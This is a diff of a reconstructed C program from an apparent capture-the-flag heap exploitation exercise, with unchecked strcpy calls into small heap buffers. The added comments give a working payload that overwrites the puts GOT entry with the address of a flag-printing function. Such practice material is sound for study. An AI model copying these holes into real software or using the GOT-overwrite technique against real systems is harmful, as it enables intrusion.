@@ -6,25 +6,28 @@
 char *flag;
 char *str = "~~";
 
-void m(void) {  // 0x080484f4
-  printf("%s - %d\n", flag, (int) time(NULL));
+void m(void) { // 0x080484f4
+  printf("%s - %d\n", flag, (int)time(NULL));
 }
 
-int main(int argc, char** argv) {
-  int* p1 = malloc(8);  // 0x804a008
+int main(int argc, char **argv) {
+  int *p1 = malloc(8); // 0x804a008
   // to inspect: x/8xw 0x0804a008
   p1[0] = 1;
-  p1[1] = (int) malloc(8);  // 0x804a018
+  p1[1] = (int)malloc(8); // 0x804a018
   // to inspect: x/8xw 0x0804a018
-  int* p2 = malloc(8);  // 0x804a028
+  int *p2 = malloc(8); // 0x804a028
   // to inspect: x/8xw 0x0804a028
   p2[0] = 2;
-  p2[1] = (int) malloc(8); //  0x0804a038
+  p2[1] = (int)malloc(8); //  0x0804a038
   // to inspect: x/8xw 0x0804a038
-  strcpy((char*) p1[1], argv[1]);
-  strcpy((char*) p2[1], argv[2]);
+  strcpy((char *)p1[1], argv[1]);
+  strcpy((char *)p2[1], argv[2]);
   fgets(flag, 68, fopen("/home/user/level8/.pass", "r"));
   puts(str);
   return 0;
-  // $(python -c "print('aaaaa' + '\xf4\x84\x04\x08' * 200)") toto
+  // $(python -c "print('A' * 20)") $(python -c "print('B' * 20)")
+  // puts@plt = 0x8049928
+  // $(python -c "print('A' * 20 + '\x28\x99\x04\x08')") $(python -c
+  // "print('\xf4\x84\x04\x08')")
 }
